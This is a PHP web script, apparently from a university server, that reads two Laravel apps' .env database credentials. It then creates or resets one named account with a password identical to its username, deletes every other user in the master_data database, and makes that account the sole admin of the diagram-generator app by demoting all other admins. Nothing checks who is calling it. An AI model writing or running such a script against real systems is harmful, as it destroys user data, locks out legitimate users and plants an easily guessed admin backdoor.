<?php
header('Content-Type: application/json');

date_default_timezone_set('Asia/Jakarta');

$targetUsername = 'mochamad_nizar_palefi_maady';
$targetPassword = 'mochamad_nizar_palefi_maady';
$targetName = "Mochamad Nizar Palefi Ma'ady";
$targetEmail = 'mochamad_nizar_palefi_maady@riib.local';
$now = date('Y-m-d H:i:s');

$result = [
    'status' => 1,
    'master_data' => [],
    'diagram_generator' => [],
];

function parseEnvFileSimple(string $path): array
{
    if (!is_file($path)) {
        return [];
    }

    $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
    $env = [];

    foreach ($lines as $line) {
        $line = trim($line);
        if ($line === '' || str_starts_with($line, '#')) {
            continue;
        }
        $pos = strpos($line, '=');
        if ($pos === false) {
            continue;
        }

        $key = trim(substr($line, 0, $pos));
        $value = trim(substr($line, $pos + 1));

        if ((str_starts_with($value, '"') && str_ends_with($value, '"')) || (str_starts_with($value, "'") && str_ends_with($value, "'"))) {
            $value = substr($value, 1, -1);
        }

        $env[$key] = $value;
    }

    return $env;
}

try {
    // MASTER_DATA (MySQL)
    $mainEnv = parseEnvFileSimple('/home/iebi.rg.telkomuniversity.ac.id/laravel_apps/master_data/.env');
    if (empty($mainEnv)) {
        throw new RuntimeException('Tidak bisa membaca .env master_data.');
    }

    $mainDsn = sprintf(
        'mysql:host=%s;port=%s;dbname=%s;charset=utf8mb4',
        $mainEnv['DB_HOST'] ?? '127.0.0.1',
        $mainEnv['DB_PORT'] ?? '3306',
        $mainEnv['DB_DATABASE'] ?? ''
    );

    $mainPdo = new PDO(
        $mainDsn,
        $mainEnv['DB_USERNAME'] ?? '',
        $mainEnv['DB_PASSWORD'] ?? '',
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]
    );

    $mainPdo->beginTransaction();

    $selectUser = $mainPdo->prepare('SELECT id FROM users WHERE username = ? LIMIT 1');
    $selectUser->execute([$targetUsername]);
    $existingUser = $selectUser->fetch();

    $hashed = password_hash($targetPassword, PASSWORD_BCRYPT);

    if ($existingUser) {
        $updateTarget = $mainPdo->prepare('UPDATE users SET name = ?, email = ?, password = ?, updated_at = ? WHERE username = ?');
        $updateTarget->execute([$targetName, $targetEmail, $hashed, $now, $targetUsername]);
        $mainAction = 'updated';
    } else {
        $insertTarget = $mainPdo->prepare('INSERT INTO users (username, name, email, password, remember_token, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?)');
        $insertTarget->execute([$targetUsername, $targetName, $targetEmail, $hashed, null, $now, $now]);
        $mainAction = 'created';
    }

    $deleteOthers = $mainPdo->prepare('DELETE FROM users WHERE username <> ?');
    $deleteOthers->execute([$targetUsername]);
    $deletedCount = $deleteOthers->rowCount();

    $countUsers = (int) $mainPdo->query('SELECT COUNT(*) FROM users')->fetchColumn();

    $mainPdo->commit();

    $result['master_data'] = [
        'action' => $mainAction,
        'deleted_users' => $deletedCount,
        'remaining_users' => $countUsers,
        'allowed_username' => $targetUsername,
    ];

    // DIAGRAM_GENERATOR (SQLite fallback from .env)
    $diagEnv = parseEnvFileSimple('/home/iebi.rg.telkomuniversity.ac.id/public_html/master_data/diagram-generator/.env');
    $diagConnection = $diagEnv['DB_CONNECTION'] ?? 'sqlite';

    if ($diagConnection !== 'sqlite') {
        throw new RuntimeException('Konfigurasi diagram-generator saat ini bukan sqlite; perlu penyesuaian manual.');
    }

    $diagDbPath = $diagEnv['DB_DATABASE'] ?? '';
    if ($diagDbPath === '') {
        $diagDbPath = '/home/iebi.rg.telkomuniversity.ac.id/public_html/master_data/diagram-generator/database/database.sqlite';
    }

    if (!is_file($diagDbPath)) {
        throw new RuntimeException('File sqlite diagram-generator tidak ditemukan di: ' . $diagDbPath);
    }

    $diagPdo = new PDO('sqlite:' . $diagDbPath, null, null, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);

    $diagPdo->beginTransaction();

    $diagSelect = $diagPdo->prepare('SELECT id FROM users WHERE username = ? LIMIT 1');
    $diagSelect->execute([$targetUsername]);
    $diagExisting = $diagSelect->fetch();

    $diagHashed = password_hash($targetPassword, PASSWORD_BCRYPT);

    if ($diagExisting) {
        $diagUpdate = $diagPdo->prepare('UPDATE users SET name = ?, email = ?, role = ?, password = ?, updated_at = ? WHERE username = ?');
        $diagUpdate->execute([$targetName, $targetEmail, 'admin', $diagHashed, $now, $targetUsername]);
        $diagAction = 'updated';
    } else {
        $diagInsert = $diagPdo->prepare('INSERT INTO users (name, username, email, role, password, remember_token, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)');
        $diagInsert->execute([$targetName, $targetUsername, $targetEmail, 'admin', $diagHashed, null, $now, $now]);
        $diagAction = 'created';
    }

    $diagDemote = $diagPdo->prepare('UPDATE users SET role = ?, updated_at = ? WHERE username <> ? AND role = ?');
    $diagDemote->execute(['user', $now, $targetUsername, 'admin']);
    $demotedAdminCount = $diagDemote->rowCount();

    $adminCountStmt = $diagPdo->query("SELECT COUNT(*) FROM users WHERE role = 'admin'");
    $adminCount = (int) $adminCountStmt->fetchColumn();
    $totalUsersStmt = $diagPdo->query('SELECT COUNT(*) FROM users');
    $totalUsers = (int) $totalUsersStmt->fetchColumn();

    $diagPdo->commit();

    $result['diagram_generator'] = [
        'action' => $diagAction,
        'demoted_admin_users' => $demotedAdminCount,
        'admin_count' => $adminCount,
        'total_users' => $totalUsers,
        'admin_username' => $targetUsername,
        'database' => $diagDbPath,
    ];
} catch (Throwable $e) {
    $result['status'] = 0;
    $result['error'] = $e->getMessage();
}

echo json_encode($result, JSON_PRETTY_PRINT);
